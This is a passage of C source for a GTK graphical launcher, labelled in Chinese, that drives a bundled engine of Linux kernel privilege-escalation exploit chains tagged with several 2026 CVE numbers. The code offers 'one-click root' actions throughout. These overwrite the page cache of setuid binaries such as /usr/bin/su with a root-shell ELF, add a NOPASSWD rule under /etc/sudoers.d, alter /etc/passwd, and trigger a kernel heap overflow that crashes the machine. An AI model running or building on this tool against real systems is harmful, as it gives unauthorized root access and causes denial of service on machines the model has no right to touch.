        gtk_label_set_text(GTK_LABEL(a->status_lbl), "已手动停止");
        app_set_busy(a, FALSE);
        return;
    }

    switch (code) {
    case 0:
        verdict = "完成 (退出码 0)";
        color = "status-ok";
        break;
    case 1:
        verdict = "未通过 / 写入未生效 (退出码 1)";
        color = "status-warn";
        break;
    case 2:
        verdict = "参数或前置条件不满足 (退出码 2)";
        color = "status-warn";
        break;
    case 3:
        verdict = "本机不可用, 未做任何写入 (退出码 3)";
        color = "status-warn";
        break;
    default:
        if (code > 128) {
            verdict = "被信号终止";
            color = "status-err";
        } else {
            verdict = "异常退出";
            color = "status-err";
        }
        break;
    }

    {
        char line[160];
        g_snprintf(line, sizeof(line), "\n── 进程结束: %s ──\n", verdict);
        log_flush(a);
        log_append_plain(a, line);
    }

    gtk_widget_set_name(a->status_lbl, color);
    gtk_label_set_text(GTK_LABEL(a->status_lbl), verdict);

    app_set_busy(a, FALSE);
}

/* 启动 poc。argv 以 NULL 结尾, 不含程序名 */
static gboolean app_spawn(App *a, char **args, const char *what)
{
    struct winsize ws;
    char *argv[32];
    int argc = 0, i;
    pid_t pid;
    const Chain *c = cur_chain(a);
    int eng = c ? c->engine : 0;
    const char *esw = (eng == 1) ? "--ovs"
                    : (eng == 2) ? "--frag"
                    : (eng == 3) ? "--cve43503"
                    : (eng == 4) ? "--cve31635"
                    : (eng == 5) ? "--diagspill" : "--engine";
    char eflag[16] = "";

    if (eng != 0 && !a->poc_builtin) {
        log_append_plain(a,
            "[!] 这条链只能用内置引擎，不能用 --poc 指定外部程序。\n");
        return FALSE;
    }

    if (a->running) {
        gtk_label_set_text(GTK_LABEL(a->status_lbl), "已有任务在运行");
        return FALSE;
    }
    a->action = what;
    log_reset(a);
    if (!a->poc_path) {
        log_append_plain(a, "[!] 找不到引擎 (内置引擎异常, 可用 --poc <路径> 指定外部 poc)。\n");
        return FALSE;
    }

    memset(&ws, 0, sizeof(ws));
    ws.ws_col = PTY_COLS;
    ws.ws_row = PTY_ROWS;

    if (a->poc_builtin)
        g_snprintf(eflag, sizeof(eflag), "%s ", esw);

    /* 分隔线 + 命令行回显 */
    {
        char *cmdline = g_strjoinv(" ", args);
        char head[PATH_BUF * 3];
        g_snprintf(head, sizeof(head), "\n\033[2m══ %s ══\n$ %s %s%s\033[0m\n",
                   what ? what : "运行", a->poc_path, eflag, cmdline);
        ansi_feed(a, head, strlen(head));
        log_flush(a);
        g_free(cmdline);
    }

    argv[argc++] = a->poc_path;
    if (a->poc_builtin)
        argv[argc++] = (char *)esw;
    for (i = 0; args[i] && argc < 30; i++)
        argv[argc++] = args[i];
    argv[argc] = NULL;

    pid = forkpty(&a->master_fd, NULL, NULL, &ws);
    if (pid < 0) {
        char msg[256];
        g_snprintf(msg, sizeof(msg), "[!] forkpty 失败: %s\n", strerror(errno));
        log_append_plain(a, msg);
        return FALSE;
    }

    if (pid == 0) {
        /* 子进程: 0/1/2 已指向 pty 从端 */
        setenv("TERM", "xterm-256color", 1);
        unsetenv("NO_COLOR");
        execvp(a->poc_path, argv);
        fprintf(stderr, "exec %s 失败: %s\n", a->poc_path, strerror(errno));
        _exit(127);
    }

    a->pid = pid;
    a->running = TRUE;
    a->stop_requested = FALSE;
    a->cur_fg = -1;
    a->cur_bold = a->cur_dim = 0;
    a->ansi_state = 0;

    fcntl(a->master_fd, F_SETFL, fcntl(a->master_fd, F_GETFL) | O_NONBLOCK);

    {
        GIOChannel *ch = g_io_channel_unix_new(a->master_fd);
        g_io_channel_set_encoding(ch, NULL, NULL);
        g_io_channel_set_buffered(ch, FALSE);
        a->watch_id = g_io_add_watch(ch, G_IO_IN | G_IO_HUP | G_IO_ERR,
                                     on_pty_readable, a);
        g_io_channel_unref(ch);
    }

    a->child_id = g_child_watch_add(pid, on_child_exit, a);

    gtk_label_set_text(GTK_LABEL(a->status_lbl), "运行中…");
    gtk_widget_set_name(a->status_lbl, "status-run");
    app_set_busy(a, TRUE);
    gtk_widget_grab_focus(a->entry_input);

    return TRUE;
}

static void app_kill(App *a, int sig)
{
    if (a->pid > 0) {
        kill(a->pid, sig);
        if (sig != SIGKILL)
            kill(-a->pid, sig);
    }
}

static gboolean kill_escalate(gpointer data)
{
    App *a = data;

    /* 只在这条子进程还挂着时才补刀, 避免 pid 被回收后误杀 */
    if (a->running && a->pid > 0) {
        kill(a->pid, SIGKILL);
        kill(-a->pid, SIGKILL);
    }
    return G_SOURCE_REMOVE;
}

static void app_stop(App *a)
{
    if (!a->running)
        return;

    a->stop_requested = TRUE;
    log_append_plain(a, "\n[*] 正在终止子进程…\n");
    app_kill(a, SIGTERM);
    g_timeout_add(1200, kill_escalate, a);
}

/* ---------------------------------------------------------------------------
 * 界面部件
 * ------------------------------------------------------------------------ */
static void app_set_busy(App *a, gboolean busy)
{
    GtkWidget *w[] = {
        a->btn_check, a->btn_test, a->btn_lpe, a->btn_write, a->btn_find,
        a->combo,
    };
    int i;

    for (i = 0; i < (int)(sizeof(w) / sizeof(w[0])); i++)
        gtk_widget_set_sensitive(w[i], !busy);
    gtk_widget_set_sensitive(a->btn_stop, busy);

    if (busy)
        gtk_spinner_start(GTK_SPINNER(a->spinner));
    else
        gtk_spinner_stop(GTK_SPINNER(a->spinner));
}

/* 当前选中的链: 0 表示"全部" -> NULL */
static const Chain *cur_chain(App *a)
{
    int idx = gtk_combo_box_get_active(GTK_COMBO_BOX(a->combo));

    if (idx <= 0 || idx > N_CHAINS)
        return NULL;
    return &chains[idx - 1];
}

static void update_desc(App *a)
{
    int idx = gtk_combo_box_get_active(GTK_COMBO_BOX(a->combo));

    if (idx < 0) {
        gtk_label_set_markup(GTK_LABEL(a->lbl_name), "<b>暂未选择CVE</b>");
        gtk_label_set_text(GTK_LABEL(a->lbl_desc),
                           "点左上角「展开」，从类别面板选择漏洞类别；"
                           "同一类别里有多个漏洞时再在「漏洞选择」里挑。");
        gtk_label_set_text(GTK_LABEL(a->lbl_need), "");
        return;
    }

    if (idx == 0) {
        gtk_label_set_markup(GTK_LABEL(a->lbl_name),
                             "<b>全部（dirtychains 十链）</b>");
        gtk_label_set_text(GTK_LABEL(a->lbl_desc),
                           "检查配置与自测会依次跑完 dirtychains 各链；OVS 链与 Fragnesia 链请单独选择后再操作。");
        gtk_label_set_text(GTK_LABEL(a->lbl_need), "");
        return;
    }

    {
        const Chain *c = &chains[idx - 1];
        char *mk = g_markup_printf_escaped("<b>%s</b>", c->name);

        gtk_label_set_markup(GTK_LABEL(a->lbl_name), mk);
        g_free(mk);
        gtk_label_set_text(GTK_LABEL(a->lbl_desc), c->desc);
        gtk_label_set_text(GTK_LABEL(a->lbl_need), c->need);
    }
}

/* 动作按钮的前置校验: 还没选 CVE 时拒绝执行 */
static gboolean require_chain(App *a)
{
    if (gtk_combo_box_get_active(GTK_COMBO_BOX(a->combo)) >= 0)
        return TRUE;
    gtk_label_set_text(GTK_LABEL(a->status_lbl),
                       "暂未选择CVE：请先在左侧类别面板选择");
    gtk_widget_set_name(a->status_lbl, "status-warn");
    return FALSE;
}

/* 当前链是否属于多链类别; 是则返回成员表 */
static const int *chain_multi_members(int chain_idx, int *n_out)
{
    int c, i;

    for (c = 0; c < N_CATS; c++) {
        if (side_cats[c].members) {
            for (i = 0; i < side_cats[c].n; i++)
                if (side_cats[c].members[i] == chain_idx) {
                    if (n_out)
                        *n_out = side_cats[c].n;
                    return side_cats[c].members;
                }
        }
    }
    return NULL;
}

/*
 * 「漏洞选择」框 (配置区上方): 只有当前链属于多链类别
 * (原地写类 / OOB/越界写类) 时才显示, 里面只列该类的成员漏洞。
 */
static void sync_cve_box(App *a)
{
    int idx = gtk_combo_box_get_active(GTK_COMBO_BOX(a->combo));
    const int *m;
    int n = 0, k, cur = -1;

    if (!a->cve_revealer || !a->cve_combo)
        return;

    m = idx > 0 ? chain_multi_members(idx - 1, &n) : NULL;
    if (!m) {
        gtk_revealer_set_reveal_child(GTK_REVEALER(a->cve_revealer), FALSE);
        return;
    }

    g_signal_handler_block(a->cve_combo, a->cve_combo_sig);
    gtk_combo_box_text_remove_all(GTK_COMBO_BOX_TEXT(a->cve_combo));
    for (k = 0; k < n; k++) {
        gtk_combo_box_text_append_text(GTK_COMBO_BOX_TEXT(a->cve_combo),
                                       chains[m[k]].tag);
        if (m[k] == idx - 1)
            cur = k;
    }
    gtk_combo_box_set_active(GTK_COMBO_BOX(a->cve_combo), cur < 0 ? 0 : cur);
    g_signal_handler_unblock(a->cve_combo, a->cve_combo_sig);

    gtk_revealer_set_reveal_child(GTK_REVEALER(a->cve_revealer), TRUE);
}

/* 「漏洞选择」框里换漏洞 -> 按当前所属类别映射回链 */
static void on_cve_combo_changed(GtkComboBox *box, gpointer data)
{
    App *a = data;
    int cur = gtk_combo_box_get_active(GTK_COMBO_BOX(a->combo));
    const int *m;
    int n = 0, k = gtk_combo_box_get_active(box);

    m = cur > 0 ? chain_multi_members(cur - 1, &n) : NULL;
    if (!m || k < 0 || k >= n)
        return;
    if (cur != m[k] + 1)
        gtk_combo_box_set_active(GTK_COMBO_BOX(a->combo), m[k] + 1);
}

/* 右上角的当前 CVE 状态 */
static void update_cve_hint(App *a)
{
    int idx = gtk_combo_box_get_active(GTK_COMBO_BOX(a->combo));
    const char *txt;

    if (!a->cve_hint_lbl)
        return;
    if (idx < 0)
        txt = "暂未选择CVE";
    else if (idx == 0)
        txt = "全部类 · 检查 / 自测";
    else
        txt = chains[idx - 1].name;
    gtk_label_set_text(GTK_LABEL(a->cve_hint_lbl), txt);
}

static void side_select(App *a, int idx);

/*
 * 参数面板按所选 CVE 显隐: 每条链支持的参数不一样,
 * 不支持的一整行藏起来, 选中哪条就只露哪条的参数。
 * 未选择时全部显示。
 */
static void sync_params_ui(App *a)
{
    const Chain *c = cur_chain(a);
    gboolean all = (c == NULL);

    gtk_widget_set_visible(a->lbl_t,    all || c->p_t);
    gtk_widget_set_visible(a->browse_t, all || c->p_t);
    gtk_widget_set_visible(a->entry_target, all || c->p_t);

    gtk_widget_set_visible(a->lbl_to,    all || c->p_write);
    gtk_widget_set_visible(a->browse_to, all || c->p_write);
    gtk_widget_set_visible(a->entry_to,  all || c->p_write);

    gtk_widget_set_visible(a->lbl_set,    all || c->p_write);
    gtk_widget_set_visible(a->browse_set, all || c->p_write);
    gtk_widget_set_visible(a->entry_set,  all || c->p_write);

    gtk_widget_set_visible(a->lbl_off,  all || c->p_off);
    gtk_widget_set_visible(a->off_row,  all || c->p_off);

    gtk_widget_set_visible(a->lbl_krec,  all ? FALSE : c->engine == 1);
    gtk_widget_set_visible(a->entry_krec, all ? FALSE : c->engine == 1);
    gtk_widget_set_visible(a->btn_vmlinux, all ? FALSE : c->engine == 1);
    gtk_widget_set_visible(a->btn_pick_offset, all ? FALSE : c->engine == 1);
    gtk_widget_set_visible(a->lbl_root_off, all ? FALSE : c->engine == 1);
    gtk_widget_set_visible(a->root_off_row, all ? FALSE : c->engine == 1);

    if (!all) {
        /* 占位提示随链微调 */
        if (c->engine == 1)
            gtk_entry_set_placeholder_text(GTK_ENTRY(a->entry_target), "");
        else if (c->engine == 2 || c->engine == 3)
            gtk_entry_set_placeholder_text(GTK_ENTRY(a->entry_target),
                                           "目标文件 (默认 /usr/bin/su，只改页缓存)");
        else if (!strcmp(c->id, "-2026-43500"))
            gtk_entry_set_placeholder_text(GTK_ENTRY(a->entry_target),
                                           "目标文件 (默认 /etc/passwd)");
        else
            gtk_entry_set_placeholder_text(GTK_ENTRY(a->entry_target),
                                           "留空则自动选择 setuid-root 的 su");
        gtk_entry_set_placeholder_text(GTK_ENTRY(a->entry_to),
            (c->p_write && !strcmp(c->id, "-2026-43494"))
                ? "整页 4096 字节覆盖 (需页对齐)" : "要被覆盖的文件 (只需可读)");
    }
}

static void on_combo_changed(GtkComboBox *box, gpointer data)
{
    App *a = data;

    (void)box;
    update_desc(a);
    /* 下拉框改了, 抽屉列表跟着选中 (side_sync 防止回环) */
    side_select(a, gtk_combo_box_get_active(GTK_COMBO_BOX(a->combo)));
    sync_cve_box(a);
    update_cve_hint(a);
    sync_params_ui(a);
}

/* 简易提示对话框 */
static void show_info(App *a, GtkMessageType type, const char *title,
                      const char *primary, const char *secondary)
{
    GtkWidget *dlg = gtk_message_dialog_new(GTK_WINDOW(a->window),
                                            GTK_DIALOG_MODAL |
                                            GTK_DIALOG_DESTROY_WITH_PARENT,
                                            type, GTK_BUTTONS_OK,
                                            "%s", primary);
    gtk_window_set_title(GTK_WINDOW(dlg), title);
    if (secondary)
        gtk_message_dialog_format_secondary_text(GTK_MESSAGE_DIALOG(dlg),
                                                 "%s", secondary);
    gtk_dialog_run(GTK_DIALOG(dlg));
    gtk_widget_destroy(dlg);
}

static gboolean confirm_run(App *a, const char *what, const char *cmdline,
                            const char *note)
{
    GtkWidget *dlg;
    gint resp;

    dlg = gtk_message_dialog_new(GTK_WINDOW(a->window),
                                 GTK_DIALOG_MODAL | GTK_DIALOG_DESTROY_WITH_PARENT,
                                 GTK_MESSAGE_WARNING, GTK_BUTTONS_NONE,
                                 "确认执行 %s？", what);
    gtk_window_set_title(GTK_WINDOW(dlg), "确认");
    gtk_message_dialog_format_secondary_text(
        GTK_MESSAGE_DIALOG(dlg),
        "将要运行：\n\n%s\n\n%s\n"
        "请确认这是你自己的机器、且已获得授权。", cmdline, note);
    gtk_dialog_add_buttons(GTK_DIALOG(dlg),
                           "取消", GTK_RESPONSE_CANCEL,
                           "执行", GTK_RESPONSE_OK, NULL);
    gtk_dialog_set_default_response(GTK_DIALOG(dlg), GTK_RESPONSE_CANCEL);
    resp = gtk_dialog_run(GTK_DIALOG(dlg));
    gtk_widget_destroy(dlg);

    return resp == GTK_RESPONSE_OK;
}

/* ---------------------------------------------------------------------------
 * 动作
 * ------------------------------------------------------------------------ */
static const char *entry_text(GtkWidget *e)
{
    const char *s = gtk_entry_get_text(GTK_ENTRY(e));

    return (s && *s) ? s : NULL;
}

static void act_check(GtkWidget *w, gpointer data)
{
    App *a = data;

    (void)w;

    if (!require_chain(a))
        return;
    const Chain *c = cur_chain(a);
    char *args[3];

    if (c && c->engine == 2) {
        const char *tg = entry_text(a->entry_target);
        char *fr_args[4];
        int k = 0;

        fr_args[k++] = "-check";
        if (tg) {
            fr_args[k++] = "-t";
            fr_args[k++] = (char *)tg;
        }
        fr_args[k] = NULL;
        app_spawn(a, fr_args, "检查 Fragnesia 前置条件");
        return;
    }

    if (c && c->engine == 3) {
        const char *tg = entry_text(a->entry_target);
        char *cl_args[4];
        int k = 0;

        cl_args[k++] = "-check";
        if (tg) {
            cl_args[k++] = "-t";
            cl_args[k++] = (char *)tg;
        }
        cl_args[k] = NULL;
        app_spawn(a, cl_args, "检查 DirtyClone 前置条件");
        return;
    }

    if (c && c->engine == 4) {
        const char *tg = entry_text(a->entry_target);
        char *dd_args[4];
        int k = 0;

        dd_args[k++] = "-check";
        if (tg) {
            dd_args[k++] = "-t";
            dd_args[k++] = (char *)tg;
        }
        dd_args[k] = NULL;
        app_spawn(a, dd_args, "检查 DirtyDecrypt 前置条件");
        return;
    }

    if (c && c->engine == 5) {
        char *ds_args[] = { "-check", NULL };

        app_spawn(a, ds_args, "检查 DiagSpill 前提");
        return;
    }

    if (c && c->engine == 1) {
        char *ovs_args[] = { "-check", NULL };

        app_spawn(a, ovs_args, "检查 OVS 链前置条件");
        return;
    }

    args[0] = (char *)(c ? c->id : "-check");
    if (c) {
        args[1] = "-check";
        args[2] = NULL;
    } else {
        args[1] = NULL;
    }
    app_spawn(a, args, c ? "检查本链所需内核配置" : "检查全部链的内核配置");
}

static void act_test(GtkWidget *w, gpointer data)
{
    App *a = data;

    (void)w;

    if (!require_chain(a))
        return;
    const Chain *c = cur_chain(a);
    char *args[3];

    if (c && c->engine == 2) {
        const char *tg = entry_text(a->entry_target);
        const char *of = entry_text(a->entry_offset);
        char *fr_args[8];
        char cmd[600];
        int k = 0;

        fr_args[k++] = "-test";
        if (tg) {
            fr_args[k++] = "-t";
            fr_args[k++] = (char *)tg;
        }
        if (of) {
            fr_args[k++] = "-offset";
            fr_args[k++] = (char *)of;
        }
        fr_args[k] = NULL;

        g_snprintf(cmd, sizeof(cmd), "%s --frag -test -t %s%s%s",
                   a->poc_path, tg ? tg : "/usr/bin/su",
                   of ? " -offset " : "", of ? of : "");
        if (!confirm_run(a, "Fragnesia 自测", cmd,
                         "会改写目标文件前 192 字节的页缓存（改完不 exec 目标）。"
                         "页缓存被写脏后可能回写磁盘，请只在自有机器上跑。"))
            return;
        app_spawn(a, fr_args, "自测 Fragnesia 写原语");
        return;
    }

    if (c && c->engine == 3) {
        const char *tg = entry_text(a->entry_target);
        const char *of = entry_text(a->entry_offset);
        char *cl_args[8];
        char cmd[600];
        int k = 0;

        cl_args[k++] = "-test";
        if (tg) {
            cl_args[k++] = "-t";
            cl_args[k++] = (char *)tg;
        }
        if (of) {
            cl_args[k++] = "-offset";
            cl_args[k++] = (char *)of;
        }
        cl_args[k] = NULL;

        g_snprintf(cmd, sizeof(cmd), "%s --cve43503 -test -t %s%s%s",
                   a->poc_path, tg ? tg : "/usr/bin/su",
                   of ? " -offset " : "", of ? of : "");
        if (!confirm_run(a, "DirtyClone 自测", cmd,
                         "会改写目标文件前 192 字节的页缓存（改完不 exec 目标）。"
                         "一个 SA 只能带 4 字节，192 字节要装 48 个 SA、发 48 次包，"
                         "大约 8 秒。页缓存被写脏后可能回写磁盘，请只在自有机器上跑。"))
            return;
        app_spawn(a, cl_args, "自测 DirtyClone 写原语");
        return;
    }

    if (c && c->engine == 4) {
        const char *tg = entry_text(a->entry_target);
        char *dd_args[4];
        char cmd[600];
        int k = 0;

        dd_args[k++] = "-test";
        if (tg) {
            dd_args[k++] = "-t";
            dd_args[k++] = (char *)tg;
        }
        dd_args[k] = NULL;

        g_snprintf(cmd, sizeof(cmd), "%s --cve31635 -test -t %s",
                   a->poc_path, tg ? tg : "/usr/bin/su");
        if (!confirm_run(a, "DirtyDecrypt 自测", cmd,
                         "会把目标文件前 120 字节的页缓存换成一段 "
                         "setuid(0)+execve(/bin/sh) 的 ELF（改完不 exec 目标）。"
                         "这条是逐字节暴力猜 key，约 1/256 命中一字节，"
                         "120 字节通常要几万次 fire、耗时以分钟计。"))
            return;
        app_spawn(a, dd_args, "自测 DirtyDecrypt 写原语");
        return;
    }

    if (c && c->engine == 5) {
        char *ds_args[3];
        char cmd[600];

        ds_args[0] = "-test";
        ds_args[1] = "-force";
        ds_args[2] = NULL;
        g_snprintf(cmd, sizeof(cmd), "%s --diagspill -test -force", a->poc_path);
        if (!confirm_run(a, "DiagSpill 触发器", cmd,
                         "会建 81920 对端 SCTP 关联并触发 sctp_diag 约 10MB 堆越界写，"
                         "破坏内核内存，大概率 panic 整机重启，且需重启恢复。"
                         "这是漏洞存在性证明 / DoS 演示，不是提权"
                         "（完整 LPE 锁 6.17/6.19 + 4 vCPU/4GB）。仅在 disposable VM 上跑。"))
            return;
        app_spawn(a, ds_args, "触发 DiagSpill 堆越界写");
        return;
    }

    if (c && c->engine == 1) {
        char *ovs_args[] = { "-scan", NULL };

        app_spawn(a, ovs_args, "OVS 链自检（读原语）");
        return;
    }

    args[0] = (char *)(c ? c->id : "-test");
    if (c) {
        args[1] = "-test";
        args[2] = NULL;
    } else {
        args[1] = NULL;
    }
    app_spawn(a, args, c ? "自测本链写原语" : "全部自测");
}

static void act_find(GtkWidget *w, gpointer data)
{
    App *a = data;

    (void)w;

    char *args[] = { "-find", NULL };

    app_spawn(a, args, "扫描 setuid root 文件");
}

static void act_lpe(GtkWidget *w, gpointer data)
{
    App *a = data;

    (void)w;

    if (!require_chain(a))
        return;
    const Chain *c = cur_chain(a);
    char *args[8];
    int n = 0;
    const char *tgt = NULL;
    char cmd[600];

    if (!c) {
        show_info(a, GTK_MESSAGE_INFO, "需要选择一条链",
                  "请先在上方选择具体的 CVE。",
                  "「全部八条链」只用于配置检查与自测；"
                  "提权和通用写必须指定其中一条。");
        return;
    }

    /* Fragnesia 链：-start 改完页缓存直接 exec 目标，pty 里就是 root shell */
    if (c->engine == 2) {
        const char *tg = entry_text(a->entry_target);
        const char *of = entry_text(a->entry_offset);
        char *fr_args[8];
        char fcmd[600];
        int k = 0;

        fr_args[k++] = "-start";
        if (tg) {
            fr_args[k++] = "-t";
            fr_args[k++] = (char *)tg;
        }
        if (of) {
            fr_args[k++] = "-offset";
            fr_args[k++] = (char *)of;
        }
        fr_args[k] = NULL;

        g_snprintf(fcmd, sizeof(fcmd), "%s --frag -start -t %s%s%s",
                   a->poc_path, tg ? tg : "/usr/bin/su",
                   of ? " -offset " : "", of ? of : "");
        if (!confirm_run(a, c->name, fcmd,
                         "会把目标文件前 192 字节的页缓存换成一段 "
                         "setuid(0)+execve(/bin/sh) 的 ELF，然后 exec 该文件 —— "
                         "成功即拿到 root shell；失败时原文件不受影响（只动页缓存）。"))
            return;
        app_spawn(a, fr_args, "一键提权");
        return;
    }

    /* DirtyClone 链：-start 写完页缓存直接 exec 目标，pty 里就是 root shell */
    if (c->engine == 3) {
        const char *tg = entry_text(a->entry_target);
        const char *of = entry_text(a->entry_offset);
        char *cl_args[8];
        char cl_cmd[600];
        int k = 0;

        cl_args[k++] = "-start";
        if (tg) {
            cl_args[k++] = "-t";
            cl_args[k++] = (char *)tg;
        }
        if (of) {
            cl_args[k++] = "-offset";
            cl_args[k++] = (char *)of;
        }
        cl_args[k] = NULL;

        g_snprintf(cl_cmd, sizeof(cl_cmd), "%s --cve43503 -start -t %s%s%s",
                   a->poc_path, tg ? tg : "/usr/bin/su",
                   of ? " -offset " : "", of ? of : "");
        if (!confirm_run(a, c->name, cl_cmd,
                         "会把目标文件前 192 字节的页缓存换成一段 "
                         "setuid(0)+execve(/bin/sh) 的 ELF，然后 exec 该文件 —— "
                         "成功即拿到 root shell；失败时原文件不受影响（只动页缓存）。"
                         "整个过程约 8 秒。"))
            return;
        app_spawn(a, cl_args, "一键提权");
        return;
    }

    /* DirtyDecrypt 链：同样是把目标开头的页换成 tiny ELF，再 exec 它 */
    if (c->engine == 4) {
        const char *tg = entry_text(a->entry_target);
        char *dd_args[4];
        char dd_cmd[600];
        int k = 0;

        dd_args[k++] = "-start";
        if (tg) {
            dd_args[k++] = "-t";
            dd_args[k++] = (char *)tg;
        }
        dd_args[k] = NULL;

        g_snprintf(dd_cmd, sizeof(dd_cmd), "%s --cve31635 -start -t %s",
                   a->poc_path, tg ? tg : "/usr/bin/su");
        if (!confirm_run(a, c->name, dd_cmd,
                         "会把目标文件前 120 字节的页缓存换成一段 "
                         "setuid(0)+execve(/bin/sh) 的 ELF，然后 exec 该文件 —— "
                         "成功即拿到 root shell。逐字节猜 key，耗时以分钟计；"
                         "写之前会自动备份到 /tmp，失败按日志里的 cp 命令恢复。"))
            return;
        app_spawn(a, dd_args, "一键提权");
        return;
    }

    /* DiagSpill 链：触发堆越界写（破坏性，DoS 演示，非提权） */
    if (c->engine == 5) {
        char *ds_args[3];
        char ds_cmd[600];

        ds_args[0] = "-start";
        ds_args[1] = "-force";
        ds_args[2] = NULL;
        g_snprintf(ds_cmd, sizeof(ds_cmd), "%s --diagspill -start -force",
                   a->poc_path);
        if (!confirm_run(a, c->name, ds_cmd,
                         "同「自测」：触发 sctp_diag 约 10MB 堆越界写，破坏内核内存，"
                         "大概率 panic 整机重启。这是 DoS 演示，不是提权；"
                         "完整 LPE 仅 6.17/6.19 + 4 vCPU/4GB 成立。仅在 disposable VM 上跑。"))
            return;
        app_spawn(a, ds_args, "一键提权");
        return;
    }

    /* OVS 链走另一套参数：-start 直接在 host 上写 sudoers 并弹 root shell */
    if (c->engine == 1) {
        char *ovs_args[5];
        int on = 0;
        const char *krec;

        ovs_args[on++] = "-start";
        if ((krec = entry_text(a->entry_krec)) != NULL) {
            ovs_args[on++] = "-krec";
            ovs_args[on++] = (char *)krec;
        }
        if (gtk_toggle_button_get_active(GTK_TOGGLE_BUTTON(a->chk_verbose)))
            ovs_args[on++] = "-v";
        ovs_args[on] = NULL;

        g_snprintf(cmd, sizeof(cmd), "%s --ovs -start%s%s",
                   a->poc_path,
                   krec ? " -krec " : "", krec ? krec : "");
        if (!confirm_run(a, c->name, cmd,
                         "这条链会在 /etc/sudoers.d 下写一条 "
                         "NOPASSWD 规则，然后打开 root shell。"))
            return;
        app_spawn(a, ovs_args, "OVS 一键提权");
        return;
    }

    args[n++] = (char *)c->id;
    args[n++] = "-start";
    if (c->p_t && (tgt = entry_text(a->entry_target)) != NULL) {
        args[n++] = "-t";
        args[n++] = (char *)tgt;
    }
    if (gtk_toggle_button_get_active(GTK_TOGGLE_BUTTON(a->chk_nobackup)))
        args[n++] = "-nobackup";
    if (gtk_toggle_button_get_active(GTK_TOGGLE_BUTTON(a->chk_verbose)))
        args[n++] = "-v";
    args[n] = NULL;

    g_snprintf(cmd, sizeof(cmd), "%s %s -start%s%s%s",
               a->poc_path, c->id,
               tgt ? " -t " : "", tgt ? tgt : "",
               gtk_toggle_button_get_active(GTK_TOGGLE_BUTTON(a->chk_nobackup))
                   ? " -nobackup" : "");

    if (!confirm_run(a, c->name, cmd,
                     "这条链会直接修改磁盘上某个 setuid 文件的页缓存，"
                     "并在成功后把当前会话接管为 root。"))
        return;

    app_spawn(a, args, "一键提权");
}

static void act_write(GtkWidget *w, gpointer data)
{
    App *a = data;

    (void)w;

    const Chain *c = cur_chain(a);
    char *args[10];
    int n = 0;
    const char *to, *set, *off;
    char cmd[700];

    if (!require_chain(a))
        return;
    if (!c) {
        show_info(a, GTK_MESSAGE_INFO, "需要选择一条链",
                  "请先在上方选择具体的 CVE。",
                  "43500 的写位置固定在 /etc/passwd 首行，不支持 -to/-set。");
        return;
    }
    to = entry_text(a->entry_to);
    set = entry_text(a->entry_set);
    if (!to || !set) {
        show_info(a, GTK_MESSAGE_INFO, "缺少参数",
                  "通用写需要同时指定目标文件与内容文件。",
                  "目标文件只需可读：写的是页缓存，不落盘、不需要写权限。");
        return;
    }
    if (!strcmp(c->id, "-2026-43500")) {
        show_info(a, GTK_MESSAGE_INFO, "该链不支持通用写",
                  "CVE-2026-43500 只能改 /etc/passwd 首行。",
                  "想验证它请直接点「一键提权」。");
        return;
    }
    if (c->engine == 1) {
        show_info(a, GTK_MESSAGE_INFO, "该链没有通用写",
                  "CVE-2026-64531 的写原语只能做 32 位递减，"
                  "不能整段写文件。",
                  "请直接用「一键提权」或「自测」。");
        return;
    }
    if (c->engine == 2) {
        show_info(a, GTK_MESSAGE_INFO, "该链没有通用写",
                  "CVE-2026-46300 的载荷固定为内置的 192 字节 ELF，"
                  "只覆盖目标文件开头这一段。",
                  "要换目标就改「目标文件」和「偏移」，然后点「一键提权」。");
        return;
    }
    if (c->engine == 3) {
        show_info(a, GTK_MESSAGE_INFO, "该链没有通用写",
                  "CVE-2026-43503 的载荷同样固定为 192 字节 ELF，"
                  "而且一次只能写 4 字节，得装 48 个 SA 才写满。",
                  "要换目标就改「目标文件」和「偏移」，然后点「一键提权」。");
        return;
    }

    args[n++] = (char *)c->id;
    args[n++] = "-to";
    args[n++] = (char *)to;
    args[n++] = "-set";
    args[n++] = (char *)set;
    if ((off = entry_text(a->entry_offset)) != NULL) {
        args[n++] = "-offset";
        args[n++] = (char *)off;
    }
    if (gtk_toggle_button_get_active(GTK_TOGGLE_BUTTON(a->chk_nobackup)))
        args[n++] = "-nobackup";
    if (gtk_toggle_button_get_active(GTK_TOGGLE_BUTTON(a->chk_verbose)))
        args[n++] = "-v";
    args[n] = NULL;

    g_snprintf(cmd, sizeof(cmd), "%s %s -to %s -set %s%s%s",
               a->poc_path, c->id, to, set,
               off ? " -offset " : "", off ? off : "");
    if (!confirm_run(a, "通用写", cmd,
                     "写的是页缓存而非磁盘，目标只需读权限；"
                     "写完会读回校验，但不会执行目标。"))
        return;

    app_spawn(a, args, "通用写");
}

/*
 * 「解析 vmlinux」(仅 OVS 链):
 * 让内置引擎用 pahole/BTF + kallsyms/System.map 推导本机内核的
 * 结构偏移 —— stdout 是 JSON 摘要 / target.h 文本, 诊断走 stderr。
 * 解析出的 target.h 落到 <程序目录>/offset/<release>/, 以后没装
 * pahole 的机器也能直接命中配置表。
 */
static void act_vmlinux(GtkWidget *w, gpointer data)
{
    App *a = data;
    const Chain *c = cur_chain(a);
    char *argv[6];
    int argc;
    char *json = NULL, *th = NULL, *err1 = NULL, *err2 = NULL;
    gint st;
    GError *ge = NULL;
    char msg[PATH_BUF], exe[512], exdir[512], offdir[600], sub[640], path[760];
    const char *rel = NULL, *p, *q;
    ssize_t rl;

    (void)w;
    if (!c || c->engine != 1)
        return;
    if (!a->poc_path) {
        log_append_plain(a, "[!] 找不到内置引擎，无法解析 vmlinux。\n");
        log_flush(a);
        return;
    }
    if (a->running) {
        gtk_label_set_text(GTK_LABEL(a->status_lbl), "已有任务在运行");
        return;
    }

    log_reset(a);
    ansi_feed(a, "\n\033[2m══ 解析 vmlinux：pahole/BTF 推导本机内核偏移 ══\n\033[0m\n",
              strlen("\n\033[2m══ 解析 vmlinux：pahole/BTF 推导本机内核偏移 ══\n\033[0m\n"));
    log_flush(a);
    gtk_label_set_text(GTK_LABEL(a->status_lbl), "正在解析 vmlinux …");
    gtk_widget_set_name(a->status_lbl, "status-run");

    /* 第 1 步: -dump-krec, stdout 是 JSON, 诊断在 stderr */
    argc = 0;
    argv[argc++] = a->poc_path;
    if (a->poc_builtin)
        argv[argc++] = "--ovs";
    argv[argc++] = "-dump-krec";
    argv[argc] = NULL;

    if (!g_spawn_sync(NULL, argv, NULL, G_SPAWN_SEARCH_PATH,
                      NULL, NULL, &json, &err1, &st, &ge)) {
        g_snprintf(msg, sizeof(msg), "[!] 启动引擎失败: %s\n", ge->message);
